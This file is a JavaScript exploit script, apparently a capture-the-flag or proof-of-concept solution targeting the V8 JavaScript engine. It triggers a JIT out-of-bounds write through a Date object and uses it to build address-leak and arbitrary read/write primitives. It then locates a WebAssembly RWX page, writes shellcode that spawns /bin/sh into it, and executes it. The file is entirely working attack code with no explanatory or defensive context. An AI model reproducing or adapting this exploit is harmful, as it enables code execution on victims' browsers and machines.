const assert = function (b, msg)
{
  if (!b)
    throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{
  __dvCvt.setFloat64(0, val, true);
  return __dvCvt.getUint32(0, true) +
    __dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{
  const tmp0 = val % 0x100000000;
  __dvCvt.setUint32(0, tmp0, true);
  __dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
  return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}

wmain = getWMain();

function oob(x)
{
	const i = x.getDate();
	const arr = [1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,
		1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,
		1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,
		1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.9];
	arr2 = [2333.2333];
	arr[31-i] = 1.04380972957581745180328891149E-310;
	gg2 = new Float64Array([100.101, 101.101, 102.101, 103.101]);
	obj = {fuck: 2333, fucky: 23333, fuckw: wmain};
	orr = [obj];
	fff = new ArrayBuffer(0x20);
}

evil = new Date(-146823844 * 86400000);
normal = new Date(2333);
for(var i = 0; i < 0x8; i++){
	oob(evil);
	oob(normal);
}
for(var i = 0; i < 0x10000; i++){
	oob(normal);
}
oob(evil);
assert(arr2.length === 0x1337, "overwrite  arr2.length failed");

function AddrOf(ooo){
	orr[0] = ooo;
	return d2u(arr2[(0x11c8-0xff8)/8]);
}
function AAR(addr){
	arr2[((0x1140-0xff8)/8)+6] = u2d(addr-0x10);
	return d2u(gg2[0]);
}

function AAW(addr, data){
	var data_view = new DataView(fff);
	var backing_store = AddrOf(fff)+0x20;
	arr2[(0x298-0x80)/8] = u2d(addr);
	for(var i = 0; i < data.length; i++){
		data_view.setUint32(i*4, data[i], true);
	}
}
function leakRWX(){
	wmain_addr		= AddrOf(wmain);
	sharedInfo		= AAR(wmain_addr+0x18);
	wasmExportedFuncData	= AAR(sharedInfo+0x8);
	wasmInstance		= AAR(wasmExportedFuncData+0x10);
	mmap_addr		= AAR(wasmInstance+0x80);
	return mmap_addr;
}
function writeRWX(mbase){
	var shellcode=[0x56f63148,0x622fbf48,
		0x2f2f6e69,0x54576873,
		0x583b6a5f,0x90050f99];
	AAW(mbase, shellcode);
}
mbase = leakRWX();
console.log("RWX PAGE: " + hex(mbase))
console.log("WRITE SHELLCODE INTO WASM")
writeRWX(mbase);
wmain();

